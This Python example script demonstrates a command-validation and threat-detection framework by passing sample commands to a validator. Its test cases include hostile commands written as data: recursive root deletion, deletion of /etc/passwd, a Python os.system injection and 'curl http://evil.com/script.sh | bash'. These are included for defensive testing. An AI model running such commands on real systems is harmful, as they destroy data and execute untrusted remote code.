#!/usr/bin/env python3
"""
Security Features Demonstration

This demo showcases tool_usage security and safety capabilities including:
- Command validation and sanitization
- Permission checking and access control
- Sandbox execution environment
- Audit logging and monitoring
- Threat detection and prevention
- Security policy enforcement

Run with: python examples/tool_usage/security_features_demo.py
"""

import sys
import argparse
import json
import time
import hashlib
from pathlib import Path
from datetime import datetime
from typing import Dict, Any, List, Optional, Tuple
import subprocess

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

try:
    from tool_usage.security.validator import SecurityValidator
    from tool_usage.security.audit import SecurityAuditor
    from tool_usage.security.sandbox import SandboxExecutor
except ImportError as e:
    print(f"Warning: Could not import security modules: {e}")
    print("This demo requires the security framework components.")


class SecurityFeaturesDemo:
    """Demonstrates security and safety features."""
    
    def __init__(self, verbose: bool = False, audit_mode: bool = False):
        """Initialize the security demo."""
        self.verbose = verbose
        self.audit_mode = audit_mode
        
        # Initialize security components if available
        try:
            self.validator = SecurityValidator()
            self.auditor = SecurityAuditor(audit_mode=audit_mode) if audit_mode else None
            self.sandbox = SandboxExecutor()
            self.security_available = True
        except:
            self.security_available = False
            if verbose:
                print("Security components not available, running in basic mode")
    
    def log(self, message: str, level: str = "INFO"):
        """Log a message if verbose mode is enabled."""
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {level}: {message}")
    
    def demonstrate_command_validation(self):
        """Demonstrate command validation and sanitization."""
        print("\n" + "="*70)
        print("1. COMMAND VALIDATION & SANITIZATION")
        print("="*70)
        
        test_cases = [
            {
                "command": "echo",
                "args": ["Hello World"],
                "description": "Safe command",
                "expected": "VALID"
            },
            {
                "command": "rm",
                "args": ["/etc/passwd"],
                "description": "Dangerous file deletion",
                "expected": "BLOCKED"
            },
            {
                "command": "rm",
                "args": ["-rf", "/"],
                "description": "Recursive root deletion",
                "expected": "BLOCKED"
            }
        ]
        
        validation_results = []
        
        for i, test_case in enumerate(test_cases, 1):
            print(f"\n🧪 Test {i}: {test_case['description']}")
            print(f"   Command: {test_case['command']} {' '.join(test_case['args'])}")
            print("-" * 50)
            
            if not self.security_available:
                print("   ⚠️  Security validator not available")
                validation_results.append({"test": test_case, "status": "SKIPPED"})
                continue
            
            try:
                # Validate command
                validation_result = self.validator.validate_command(
                    test_case['command'],
                    test_case['args']
                )
                
                print(f"   ✅ Validation result: {validation_result.status.value}")
                print(f"   📊 Risk score: {validation_result.risk_score:.2f}")
                print(f"   🔍 Checks performed: {len(validation_result.checks)}")
                
                validation_results.append({
                    "test": test_case,
                    "status": validation_result.status.value,
                    "risk_score": validation_result.risk_score,
                    "checks_passed": sum(1 for c in validation_result.checks if c.passed)
                })
                
            except Exception as e:
                print(f"   ❌ Validation error: {e}")
                validation_results.append({
                    "test": test_case,
                    "status": "ERROR",
                    "error": str(e)
                })
        
        # Summary
        valid_count = sum(1 for r in validation_results if r.get("status") == "VALID")
        blocked_count = sum(1 for r in validation_results if r.get("status") == "BLOCKED")
        
        print(f"\n📊 Validation Summary:")
        print(f"   Total tests: {len(validation_results)}")
        print(f"   Valid commands: {valid_count}")
        print(f"   Blocked commands: {blocked_count}")
        print(f"   Success rate: {valid_count / len(validation_results):.1%}")
        
        self.log("Command validation demonstration completed")
        return validation_results
    
    def demonstrate_threat_detection(self):
        """Demonstrate threat detection and prevention."""
        print("\n" + "="*70)
        print("5. THREAT DETECTION & PREVENTION")
        print("="*70)
        
        threat_test_cases = [
            {
                "command": "python",
                "args": ["-c", "import os; os.system('whoami')"],
                "threat_type": "Command Injection",
                "severity": "MEDIUM"
            },
            {
                "command": "bash",
                "args": ["-c", "curl http://evil.com/script.sh | bash"],
                "threat_type": "Remote Code Execution",
                "severity": "HIGH"
            }
        ]
        
        threat_results = []
        
        for i, threat_case in enumerate(threat_test_cases, 1):
            print(f"\n🚨 Threat Detection Test {i}: {threat_case['threat_type']}")
            print(f"   Command: {threat_case['command']} {' '.join(threat_case['args'])}")
            print(f"   Severity: {threat_case['severity']}")
            print("-" * 50)
            
            if not self.security_available:
                print("   ⚠️  Security framework not available")
                threat_results.append({"threat": threat_case, "status": "SKIPPED"})
                continue
            
            try:
                # Detect threats
                threat_analysis = self.validator.analyze_threats(
                    threat_case['command'],
                    threat_case['args']
                )
                
                print(f"   🔍 Threat analysis result: {threat_analysis.threat_level.value}")
                print(f"   🎯 Threat confidence: {threat_analysis.confidence:.2f}")
                
                # Block if high severity
                should_block = (
                    threat_case['severity'] in ['HIGH', 'CRITICAL'] or
                    threat_analysis.threat_level.value in ['HIGH', 'CRITICAL']
                )
                
                if should_block:
                    print(f"   🚫 BLOCKED: High severity threat detected")
                else:
                    print(f"   ✅ ALLOWED: Threat level acceptable")
                
                threat_results.append({
                    "threat": threat_case,
                    "threat_level": threat_analysis.threat_level.value,
                    "confidence": threat_analysis.confidence,
                    "blocked": should_block
                })
                
            except Exception as e:
                print(f"   ❌ Threat detection error: {e}")
                threat_results.append({
                    "threat": threat_case,
                    "status": "ERROR",
                    "error": str(e)
                })
        
        # Summary
        blocked_count = sum(1 for r in threat_results if r.get("blocked", False))
        
        print(f"\n📊 Threat Detection Summary:")
        print(f"   Total threats tested: {len(threat_results)}")
        print(f"   Threats blocked: {blocked_count}")
        print(f"   Block rate: {blocked_count / len(threat_results):.1%}")
        
        self.log("Threat detection demonstration completed")
        return threat_results
    
    def run_comprehensive_demo(self, audit: bool = False, sandbox: bool = False):
        """Run the complete security demonstration."""
        print("🔒 STARTING SECURITY FEATURES DEMONSTRATION")
        print("=" * 70)
        print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Security framework available: {self.security_available}")
        print(f"Audit mode: {audit}")
        print(f"Sandbox testing: {sandbox}")
        
        start_time = time.time()
        
        # Run all security demonstrations
        results = {}
        results['validation'] = self.demonstrate_command_validation()
        results['threat_detection'] = self.demonstrate_threat_detection()
        
        total_time = time.time() - start_time
        
        # Final security summary
        print("\n" + "="*70)
        print("🛡️  SECURITY DEMONSTRATION SUMMARY")
        print("="*70)
        print(f"⏱️  Total execution time: {total_time:.2f}s")
        
        if results.get('validation'):
            valid_count = sum(1 for r in results['validation'] if r.get("status") == "VALID")
            blocked_count = sum(1 for r in results['validation'] if r.get("status") == "BLOCKED")
            print(f"🔍 Command validation: {valid_count} valid, {blocked_count} blocked")
        
        if results.get('threat_detection'):
            blocked_threats = sum(1 for r in results['threat_detection'] if r.get("blocked", False))
            print(f"🚨 Threats blocked: {blocked_threats}/{len(results['threat_detection'])}")
        
        print(f"🛡️  Security framework: {'Active' if self.security_available else 'Limited'}")
        
        print("\n✅ Security Features Demonstration Completed!")
        print("\n⚠️  SECURITY REMINDER:")
        print("   - Always validate commands before execution")
        print("   - Use sandbox for untrusted code")
        print("   - Enable audit logging in production")
        print("   - Regularly update security policies")
        
        return results


def main():
    """Main entry point for the security demo."""
    parser = argparse.ArgumentParser(
        description="Security Features Demonstration",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python security_features_demo.py                  # Run full demo
  python security_features_demo.py --verbose        # Run with verbose output
  python security_features_demo.py --audit          # Enable audit logging
  python security_features_demo.py --sandbox        # Enable sandbox testing
        """
    )
    
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose output"
    )
    
    parser.add_argument(
        "--audit", "-a",
        action="store_true",
        help="Enable audit logging and monitoring"
    )
    
    parser.add_argument(
        "--sandbox", "-s",
        action="store_true",
        help="Enable sandbox execution testing"
    )
    
    args = parser.parse_args()
    
    try:
        demo = SecurityFeaturesDemo(
            verbose=args.verbose,
            audit_mode=args.audit
        )
        demo.run_comprehensive_demo(
            audit=args.audit,
            sandbox=args.sandbox
        )
        
    except Exception as e:
        print(f"\n❌ Demo failed with error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()